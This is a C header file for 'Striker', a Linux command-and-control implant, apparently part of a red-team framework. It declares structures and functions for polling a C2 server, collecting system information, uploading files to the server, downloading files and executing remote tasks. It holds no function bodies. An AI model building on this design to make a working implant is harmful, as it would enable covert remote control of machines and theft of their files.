/**
 *--------------------------------------------------
 * Header file for the Striker C2 implant for linux.
 *                                Author: Umar Abdul
 *--------------------------------------------------
 */

#ifndef STRIKER_H
#define STRIKER_H

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <curl/curl.h>
#include "striker_utils.h"
#include "cJSON.h"

// Set to non-zero value for debug outputs.
#define STRIKER_DEBUG 1
// The default URL. This is what the patcher will look for.
#define URL_SIZE (sizeof(char) * 512)
char baseURL[URL_SIZE] = "http://localhost:3000";
// Max task result size in bytes
#define MAX_RES_SIZE (sizeof(char) * 102400)

/**
 * A struct for tracking session info.
 * `uid` is the agent ID.
 * `delay` is the callback delay in seconds (default: 5)
 * `write_dir` is a full path to a writable directory, which may be used when we have to write something.
 *            Make sure it ends with a '/'.
 */
typedef struct{
  char *uid;
  unsigned long delay;
  char *write_dir;
} session;

/**
 * A struct for representing a single task.
 * `uid` is the task ID.
 * `type` is the task type.
 * `data` is the task data.
 * `completed` is set to true when the task is performed, regardless of result.
 * `result` is the result prepared result cJSON object that can be sent directly to the server.
 */
typedef struct{
  char *uid;
  char *type;
  cJSON *data;
  unsigned short completed;
  cJSON *result;
} task;

/**
 * Initializes a new CURL object for a request to `path` relative to the base URL of the C2 server.
 * It does not define any headers.
 * Defines `buff` as the buffer to use for writing reponse body by the body_receiver() function.
 */
CURL *init_curl(const char *path, buffer *buff);

/**
 * Callback function for curl to receive response body inside a buffer.
 * This may be called multiple times with chunks of data, depending on the size of the body.
 */
size_t body_receiver(void *chunk, size_t size, size_t nmemb, buffer *buff);

// Callback function for curl to write response body to a file.
size_t body_downloader(void *chunk, size_t size, size_t nmemb, FILE *wfo);

// Return a json object containing system information.
cJSON *sysinfo();

// Parse a task JSON and return it, NULL on error.
task *parse_task(cJSON *json);

// Handles task for uploading file to server. Returns 1 on success.
short int upload_file(char *url, char *filename, FILE *rfo, buffer *result_buff);

// Download a file from `url` and save to `wfo`. Returns 1 on success.
short int download_file(char *url, FILE *wfo, buffer *result_buff);

// Execute a task.
void execute_task(session *striker, task *t);

// Starts the implant.
void start_session();

// Cleanup session. Called on exit.
void cleanup_session(session *striker);

#endif // STRIKER_H
